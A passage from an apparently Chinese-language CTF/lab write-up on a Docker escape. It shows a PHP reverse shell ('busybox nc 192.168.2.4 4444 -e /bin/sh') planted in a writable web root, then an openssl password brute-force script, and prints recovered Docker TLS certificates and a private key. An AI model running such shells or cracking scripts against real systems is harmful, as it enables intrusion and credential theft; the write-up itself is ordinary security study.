rw,relatime,lowerdir=/var/lib/docker/overlay2/l/HXF4EH4QOP3PFP3WTXAFCUYMBI:/var/lib/docker/overlay2/l/BARM5SFR2TDZXCWIKPJVP2J54E:/var/lib/docker/overlay2/l/WBRDWAEECENUU744T54A2LXZS2:/var/lib/docker/overlay2/l/NYXBJ27GGJQWKCMYO6UJ4PRDD7:/var/lib/docker/overlay2/l/2CGOJZXYDP7ZY76NGXFCI5O77M:/var/lib/docker/overlay2/l/IB3IOPHPLAJEAHVWBQ5EYWLJJB:/var/lib/docker/overlay2/l/TNVVYE4RJB4773NBEHZQJWHY5E:/var/lib/docker/overlay2/l/IOUASKU43UPNCLUUQ5KR23KJZY:/var/lib/docker/overlay2/l/YQBYPMD2COWEBNNFP3NG4MISG4:/var/lib/docker/overlay2/l/DWNKLEE43NWMUACFFMR4P4WQAQ:/var/lib/docker/overlay2/l/JPKS6LRXO6GCPCLFSECB5M7YXM:/var/lib/docker/overlay2/l/PLZ3W24FVFNOEIBO3NEBTHLUQC:/var/lib/docker/overlay2/l/YCCIGEY34PYNHMPJCSJZJTX7KA:/var/lib/docker/overlay2/l/BYIG4G4KUGNW7GQJNXR6VFL5EZ,upperdir=/var/lib/docker/overlay2/72161e40a27ae003179fc6ca386782b5bcd3aeac2b5e819784305d9435966540/diff,workdir=/var/lib/docker/overlay2/72161e40a27ae003179fc6ca386782b5bcd3aeac2b5e819784305d9435966540/work 0 0<br>proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0<br>tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0<br>devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0<br>sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0<br>cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime,nsdelegate 0 0<br>mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0<br>shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k,inode64 0 0<br>/dev/sda3 /etc/resolv.conf ext4 rw,relatime 0 0<br>/dev/sda3 /etc/hostname ext4 rw,relatime 0 0<br>/dev/sda3 /etc/hosts ext4 rw,relatime 0 0<br>/dev/sda3 /var/www/html ext4 rw,relatime 0 0<br>proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0<br>proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0<br>proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0<br>proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0<br>proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0<br>tmpfs /proc/asound tmpfs ro,relatime,inode64 0 0<br>tmpfs /proc/acpi tmpfs ro,relatime,inode64 0 0<br>tmpfs /proc/interrupts tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0<br>tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0<br>tmpfs /proc/latency_stats tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0<br>tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0<br>tmpfs /proc/scsi tmpfs ro,relatime,inode64 0 0<br>tmpfs /sys/firmware tmpfs ro,relatime,inode64 0 0<br></code></pre></td></tr></table></figure><p>发现宿主机的<code>/var/www/html</code>挂载到<code>/dev/sda3</code>，并且具有<code>rw</code>权限，对应80端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html<br><span class="hljs-built_in">ls</span> -la<br>total 16<br>drwxr-xr-x    2 root     root          4096 Dec 28 10:31 .<br>drwxr-xr-x    3 root     root          4096 Aug 27  2021 ..<br>-rw-r--r--    1 root     root            19 Dec 29 15:18 a.php<br>-rw-r--r--    1 root     root          3617 Dec 27 14:55 index.php<br><span class="hljs-built_in">cat</span> a.php<br>&lt;?php phpinfo();?&gt;<br></code></pre></td></tr></table></figure><p>反弹shell即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> re.php<br>&lt;?php<br>  <span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;busybox nc 192.168.2.4 4444 -e /bin/sh&quot;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444                                                                       <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.32] 37271<br><span class="hljs-built_in">id</span><br>uid=65534(nobody) gid=65534(nobody) <span class="hljs-built_in">groups</span>=65534(nobody)<br></code></pre></td></tr></table></figure><h2 id="2、dockerapi逃逸"><a href="#2、dockerapi逃逸" class="headerlink" title="2、dockerapi逃逸"></a>2、dockerapi逃逸</h2><p>在<code>/home/alice/ilovealice</code>中发现目录<code>...</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ...<br>openssl enc -aes-256-cbc -<span class="hljs-keyword">in</span> certs.tar.gz -out tar.gz.enc  -iter 10000 -pbkdf2<br></code></pre></td></tr></table></figure><p><code>enc</code>加密后变成了<code>certs.tar.gz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> .docker<br><span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-sr-x    3 alice    alice         4096 Dec 30 00:31 .<br>drwxr-sr-x    4 alice    alice         4096 Dec 30 00:38 ..<br>-rw-r--r--    1 root     alice         5248 Dec 30 00:28 .enc<br>drwx------    2 root     root          4096 Dec 30 00:22 certs<br></code></pre></td></tr></table></figure><p>将<code>.enc</code>复制到web目录下，进行下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 rev.txt<br><span class="hljs-built_in">cat</span> /home/alice/.docker/.enc &gt; rev.txt<br></code></pre></td></tr></table></figure><p>丢给ai写一个爆破脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Usage check</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -ne 2 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> &lt;encrypted_file.tar.gz.enc&gt; &lt;wordlist.txt&gt;&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>ENC_FILE=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>WORDLIST=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$ENC_FILE</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Error: Encrypted file &#x27;<span class="hljs-variable">$ENC_FILE</span>&#x27; not found.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$WORDLIST</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Error: Wordlist &#x27;<span class="hljs-variable">$WORDLIST</span>&#x27; not found.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Starting brute-force on &#x27;<span class="hljs-variable">$ENC_FILE</span>&#x27; using &#x27;<span class="hljs-variable">$WORDLIST</span>&#x27;...&quot;</span><br><br><span class="hljs-comment"># Create a temporary file for decrypted output</span><br>TMP_DEC=<span class="hljs-string">&quot;/tmp/decrypted_$$&quot;</span><br><br><span class="hljs-comment"># Counter</span><br>COUNT=0<br><br><span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r PASS || [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$PASS</span>&quot;</span> ]; <span class="hljs-keyword">do</span><br>    ((COUNT++))<br><br>    <span class="hljs-comment"># Skip empty lines</span><br>    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$PASS</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">continue</span><br>    <span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># Try to decrypt with current password</span><br>    <span class="hljs-comment"># -d: decrypt</span><br>    <span class="hljs-comment"># -pbkdf2 -iter 10000: match your encryption settings</span><br>    <span class="hljs-comment"># -pass pass:&quot;$PASS&quot;: provide password directly (avoid stdin)</span><br>    <span class="hljs-comment"># Redirect stderr to /dev/null to suppress &quot;bad decrypt&quot; errors</span><br>    <span class="hljs-keyword">if</span> openssl enc -d -aes-256-cbc \<br>        -<span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ENC_FILE</span>&quot;</span> \<br>        -out <span class="hljs-string">&quot;<span class="hljs-variable">$TMP_DEC</span>&quot;</span> \<br>        -pbkdf2 -iter 10000 \<br>        -pass pass:<span class="hljs-string">&quot;<span class="hljs-variable">$PASS</span>&quot;</span> 2&gt;/dev/null; <span class="hljs-keyword">then</span><br><br>        <span class="hljs-comment"># Check if output is valid gzip (magic bytes: 1f 8b)</span><br>        <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">&quot;<span class="hljs-variable">$TMP_DEC</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">head</span> -c 2 <span class="hljs-string">&quot;<span class="hljs-variable">$TMP_DEC</span>&quot;</span> | hexdump -C | grep -q <span class="hljs-string">&quot;1f 8b&quot;</span>; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] SUCCESS! Password found: <span class="hljs-variable">$PASS</span>&quot;</span><br>            <span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$TMP_DEC</span>&quot;</span> <span class="hljs-string">&quot;./decrypted.tar.gz&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Decrypted file saved as &#x27;decrypted.tar.gz&#x27;&quot;</span><br>            <span class="hljs-built_in">exit</span> 0<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-comment"># Decryption succeeded but not valid gzip? (unlikely, but possible)</span><br>            <span class="hljs-built_in">rm</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$TMP_DEC</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># Progress every 1000 attempts</span><br>    <span class="hljs-keyword">if</span> [ $((COUNT % <span class="hljs-number">1000</span>)) -eq 0 ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Tried <span class="hljs-variable">$COUNT</span> passwords...&quot;</span><br>    <span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$WORDLIST</span>&quot;</span><br><br><span class="hljs-built_in">rm</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$TMP_DEC</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] Password not found in wordlist.&quot;</span><br><span class="hljs-built_in">exit</span> 1<br></code></pre></td></tr></table></figure><p>成功解密出密码：<code>060606</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ./bp.sh enc /usr/share/wordlists/rockyou.txt<br>[*] Starting brute-force on <span class="hljs-string">&#x27;enc&#x27;</span> using <span class="hljs-string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span>...<br>[*] Tried 1000 passwords...<br>[*] Tried 2000 passwords...<br><br>[+] SUCCESS! Password found: 060606<br>[+] Decrypted file saved as <span class="hljs-string">&#x27;decrypted.tar.gz&#x27;</span><br></code></pre></td></tr></table></figure><p><code>certs.tar.gz</code>解压后得到的是证书文件和密钥文件，可以用来通过 docker 的 Authz-broker认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp/certs]<br>└─# <span class="hljs-built_in">cat</span> ca.pem                                        <br>-----BEGIN CERTIFICATE-----<br>MIIFCTCCAvGgAwIBAgIUYN6pFeK0ToJUOXBJLWs1F/sxuPIwDQYJKoZIhvcNAQEL<br>BQAwFDESMBAGA1UEAwwJZG9ja2VyLWNhMB4XDTI1MTIyNzE1MDQyNloXDTM1MTIy<br>NTE1MDQyNlowFDESMBAGA1UEAwwJZG9ja2VyLWNhMIICIjANBgkqhkiG9w0BAQEF<br>AAOCAg8AMIICCgKCAgEAznSWI7sJA3p/7Fe/oLC71w0hatV15PoG6/eKg1Dbhuy2<br>ulUdTxb3PGlECPl0yjBsFqVbroJ3XB5P9GFxRrt05ytTmHOz726l9G9GslwNcIK3<br>CrI+GDXAuTnZFBpvZOBbNDHmIunl5gJvTHYovE2yGJezdt/utS1EyOAKbajE4RaN<br>pkYP9vTwSf0PLX/NQ31JiJyELQajXGqNxQllwWcXUHElFeA4GMRQrV8ZnPI2wFw7<br>Hjcdcwo8csHpSLSsYs8SlWy+vGjwlbPk1F4ueRcp69bLR/IwBLPSwSSAYl9ro8s2<br>0NE9dLKCr6a5f6M5TMGXqne/mlqEUCqefJodVubaNqgPrNri0A4c2vp01s3SoYA9<br>RukWGuVTWz9zFN6G4AZUTl9Sy6ddJ+fU2vfTDd4dQ9rkYvIR870I2FqL1Ohcg0Qu<br>Q5NtWFrjQkhySoRHuqwvKdvKVLuKp1xDEu6vu3Hu8r5BJLt0Q6hxG98IEEBkvw1b<br>Sv/Y5gH0Mp/v8bqkmVGDJzXbaKOkMweEYmI7Ono8lH1aBjxIEM+1tgfgICrr+DmY<br>xeS89b9XqVAGCE+8C4gKFJXNwSVdr6xBfVa2AnSZ4jvEkvSoHVLrqfMbomcj6nKD<br>x/pyj1J6BZfYEfjJ07+CgC0Bd7I5E+hi7o4bseRM5rCO9PClpIGeD75e1Ip0RIUC<br>AwEAAaNTMFEwHQYDVR0OBBYEFIMyGXZCe31oC+wEtq4/bP3xdjYEMB8GA1UdIwQY<br>MBaAFIMyGXZCe31oC+wEtq4/bP3xdjYEMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZI<br>hvcNAQELBQADggIBAMXNCaAZiFGKKUIcvLvAjoQYyWhqhrRL0PQwBJI+aV55cxeo<br>2KC23g/r9CJfOqLGdjLRU1vAWT+yCHzdKIUOelWjpiENruQ9+ZeLGFA0enZmigq0<br>MUSrzLCXTQdvyL8OMFyxwQCIyNPmriLx/63a2XX4ka/c72TzYFJ5VtmKrzFc1CmK<br>Lso19v0Ae1DBTUjefVB3ZFMGbpVCZ3z8SiWg8FaWg90F5/KLHm8tksTF0DbuAIG8<br>NZ8R8Epbem3eqaT3UWS1WsVdpAJwicJxmOGGj3rAVAp5k2WfJ/Myka5qwgcgScoB<br>ncECvWqt6jMg6t2MKtrD7UTCAL9yC43nUxovtLGSMaJMcjb/uDPcwrqN7IX1Qydr<br>huAsy4aLqm833JKks37qEdV5hexwti3FtYfsvg/GfzumzthAwVMf1MNdLTxfZhYu<br>rEhQ+DnZEk4TQm8aOLJjTNJr8NddwqNVz8GX27yTtd78s79SCWEKOXO7lQnH1HDZ<br>UjHrZ0xK5le8TW+bjDD9/w6XAcynyvHQVFXVd2YsvZoriuCntn3NimDUtjP6KqJn<br>Yjb3ItHl1bcgxh9m6BB9TvboQbC981VN+3+5tSDcZpJMYbvbb9+ZaxNfqCNFf4ua<br>C+8NWsoMVBIwHGeR1/5wrS1CU5J/n2BbHaNnefLpmMyXfc9xe6j6hbtdzTy/<br>-----END CERTIFICATE-----<br><br><br>┌──(root㉿kali)-[/tmp/certs]<br>└─# <span class="hljs-built_in">cat</span> client-cert.pem <br>-----BEGIN CERTIFICATE-----<br>MIIE/DCCAuSgAwIBAgIUaj+sVaQZlFfb+PTf3BjS8CA8LSMwDQYJKoZIhvcNAQEL<br>BQAwFDESMBAGA1UEAwwJZG9ja2VyLWNhMB4XDTI1MTIyNzE1MDQyN1oXDTM1MTIy<br>NTE1MDQyN1owGDEWMBQGA1UEAwwNZG9ja2VyLWNsaWVudDCCAiIwDQYJKoZIhvcN<br>AQEBBQADggIPADCCAgoCggIBALvnYo+n1KxS3rljdYYlxRFi+BEZ2jVpdew1/vw0<br>hALe71NHDSRBWL5mOgtByiKsBJzWSMNb6OdVaUWWcnTG0LaDcyt1Gx9nwFSKtMqT<br>yEkblD5lDHF8m0MJPA9SLijspcVUDvF+qTkW5IkUVDXud0Hznqbq9kN/eOfHaqTw<br>AigSSynLp60JxYuMD3mpPJPwBafaFu3GvdLAQLF16gbcE4D+2g/+ojrCRAQTam6B<br>SDEnPjs7qEft/DYXNSEfX1bLsJi9M/QsW65p7dND+9897uhXKj4E4s5Zq4G8PiHu<br>WRakm2kF9x1t/3hPU6m3tF0ZvZZToZ0Vc7KweWsM538Heu4JG5L+JF/PPVBxZnv5<br>cW4U779oJgyrU9ZhYAR3TF+cyJXT4nrO7+iFobU0J5EDVnZfh4Dn/maaJUA45OKN<br>stvNj3R5lT+31SJfQCYRG/gQcPWDNYhl4wrN2OioN0Xx61EdFEcaHfElDfJfq9v/<br>LC4HfTtxiKZyJmGCrkTG3zg8TQ4TrvElxaepeI+N2WhL4Q92+fiOR2DUUH9Z1nnQ<br>fkyECS7Ct+xx20np+UgiID+UJP7zGA8qOXoWEIpubLF5yAVRy+tyviJP1tzwAQFC<br>qqd8g4PCr0fbbOPD5U4FXVianXyVn34r6zrTOqTh0cAaE0qlzfFV2GTQRolc0I6t<br>pXzBAgMBAAGjQjBAMB0GA1UdDgQWBBR8MbBz6oZ3TAxXNE4w8Sg19c7kAzAfBgNV<br>HSMEGDAWgBSDMhl2Qnt9aAvsBLauP2z98XY2BDANBgkqhkiG9w0BAQsFAAOCAgEA<br>FVIp82ahPbY/lIcWZkPaMiFtogpWTHuQfzPil+Pn/oN7kDC86w7M2QAwBEmCi267<br>4QIxOvg7STkwCjwH93+Gwv205mpfWTo9Fhko+Yg/0dCFn+QL7PH5iW/a67+jwLmj<br>6R+0fRcwCyAoBEmqblIzW/Fnwy/BT2J9EyPlCzYMmSBSCMu4J1Tged1inqOCcCSW<br>LGEfWKaZ6lXCmn9h0VPLVYc4OzR9s2lMnS27VVX5pTYVSGfVElMpMHBN6B1qptuy<br>Pdml5qYEkdvDEj8KtPM2ccWODyqBVzc1z4xblAG8xKdAcj1azxzBFtLfBHyndzYz<br>T+OQ6eHcgCeeQOVj+jDRXcRgYD+uZml7ZBZOa2JCDYvPFQ+tqUMButZk6PTIDW5c<br>W1rqClbg1IVZQrnZoHHA2awmQmEcPMYvw3E9geJ5ZBv2hxQtiDj/P5f0TLKKl5Ob<br>kn3iYZvn45ItN3MoxyDLflZ8weECmBDHr2ivoGjy6en+PMDv2ZcDzAM3sNS5vHdF<br>hgrkEBaImha6lA+r5fX8Hoy9HNLiEs53/0J2Rc3NmGlfPvSEf9Nt2cFFBK6OicrJ<br>7l2oNyCGPqffQkFGVvJhoxdaJ9dn+2co14U1HNMvNVQdBSCaMiQdFJ7F+VH9QoZO<br>GlZz5PXOFOMy9yN2E2GfTRlzyh5TuCtym9tcCU3tfqA=<br>-----END CERTIFICATE-----<br><br><br>┌──(root㉿kali)-[/tmp/certs]<br>└─# <span class="hljs-built_in">cat</span> client-key.pem <br>-----BEGIN PRIVATE KEY-----<br>MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC752KPp9SsUt65<br>Y3WGJcURYvgRGdo1aXXsNf78NIQC3u9TRw0kQVi+ZjoLQcoirASc1kjDW+jnVWlF<br>lnJ0xtC2g3MrdRsfZ8BUirTKk8hJG5Q+ZQxxfJtDCTwPUi4o7KXFVA7xfqk5FuSJ<br>FFQ17ndB856m6vZDf3jnx2qk8AIoEkspy6etCcWLjA95qTyT8AWn2hbtxr3SwECx<br>deoG3BOA/toP/qI6wkQEE2pugUgxJz47O6hH7fw2FzUhH19Wy7CYvTP0LFuuae3T<br>Q/vfPe7oVyo+BOLOWauBvD4h7lkWpJtpBfcdbf94T1Opt7RdGb2WU6GdFXOysHlr<br>DOd/B3ruCRuS/iRfzz1QcWZ7+XFuFO+/aCYMq1PWYWAEd0xfnMiV0+J6zu/ohaG1<br>NCeRA1Z2X4eA5/5mmiVAOOTijbLbzY90eZU/t9UiX0AmERv4EHD1gzWIZeMKzdjo<br>qDdF8etRHRRHGh3xJQ3yX6vb/ywuB307cYimciZhgq5Ext84PE0OE67xJcWnqXiP<br>jdloS+EPdvn4jkdg1FB/WdZ50H5MhAkuwrfscdtJ6flIIiA/lCT+8xgPKjl6FhCK<br>bmyxecgFUcvrcr4iT9bc8AEBQqqnfIODwq9H22zjw+VOBV1Ymp18lZ9+K+s60zqk<br>4dHAGhNKpc3xVdhk0EaJXNCOraV8wQIDAQABAoICAA2sJSR60SNw1uVPyAoTeXwY<br>YssrwbryijK+gxKVklLQfJg8qpzMEcmuOo79zILVWB3pYbCwDAm5J0h5oqkTRmCM<br>FAyXdXpwMYh1R05uORFIwR1We59OXSXK6DndKvVYstSMQezEi0pXe22WCG1G2sVL<br>wBbj2zjHb7lobelueq8GaxMGzz6XYBkVVJLvrjQS2kvVDKdkjK9nGc36hyV/TKlY<br>N0RurMibFhk4fcgTVCNveDxrIjA0WuO8sJBRGL4suBQvwDYGJu2mpjgh0ZP0N7a5<br>kPNOUQqJb8yoMS/a3f9NyZkiEVHCN+fogxftrAwSMWoHenz+8Jo8nmPHCUPZptIc<br>n29fDrA/T//qlZKSgthnabdgWfc07D7cGbuIj1SH0wpQw3r6hw3e+nuNUZRMQvl4<br>KIfUeNkNq1SN1/navi4AoAHyFentH+Mcbi5rn3X+kpnPlIUKk8fSZJXCgZYbtJa0<br>wuQk4qAIawcdoNMZ8RqGO686Wt5SZ6XxVf69q+da8b9Op3ZyUbDztZARqJylTvNc<br>+J2TM9YLsr8xF3FFozCPKdpcqC+YxnruNtaXS1VKqzjfdWdLut4kk1i+o+ABKr2m<br>yqbz7p78P4QcIhcpW/vHW1/MYzPs0HfYR79kydmcoxZO+liQ6QWdY5UiQSUibHBk<br>ikfbqQZuftNHNmagxVghAoIBAQDe+pgXoM/mGqtDt0TrrNzogO6Wo6/cV2muSiia<br>fyfO24UYy6MrHg1MIAvewmnSMlZXeoFWikPdrm0+u4JrKymhB0O1Ay9qVAAYUZr3<br>3og4+g3VOJmHdx7rdbsl4z3Suosble6C0nSWK0GayZJmV2qgAcSnrhujAxe14pja<br>NSyXACxdmtgUSFOFYiQ0Nv5dieIZgvSKFy7ivfwpUvqKYkUeHudtA11S6vyW89CJ<br>K+HfFnow40rdZ5uP1IJjiGRl+eRWUt9rlglhCL9ac7//3h1NtM4T5vr0G50oTBpb<br>2HcMwzHWa2g6OBPLcJs9sbjICpV1kX32DAWzOs51pfDN46KlAoIBAQDXuw2FKgTn<br>zEF5Z+64J9U7EG7cGjQ2MhWR8tdECvek3PPlMDHmWZ59F+A+rgpauz3RnY0q/Rcv<br>LwTgOMf03HnxFeu5u+aNeD7bB5X9MAlW8wl9nnzkmtHSC7Noz1QIbU6BPypT3NAb<br>DPJfB/hZpvbC8r4UE0R8kuVk8FDJjmWcJpLhxYRylAW5KFyTQRYwSS7xq0Y8cdZG<br>2eZeuB+ffG80HDrjeP4EBWXNd/MG+Xz8pK3Fstjs5WGUE5cg3m7OcQh0vv4la95e<br>8QbOKNUitMlHXlda8jqBzFrughBPOk+LPQT0Wd4nJ7m1TW1uGrFp7aSjFU/NjVeE<br>H20hjkxRtiLtAoIBAQCY2nR0jhq2hMWuz+2BGaj+AZSM03z0sT+S6OdYsZ4aYcWl<br>r8MVBa7b5oP8mo1sOHGT2jjbmEDZsH7XKDdJO/d3mcFCTwKsAxVllluDW5tKY7Aj<br>4H7urCwYAUbfvB1f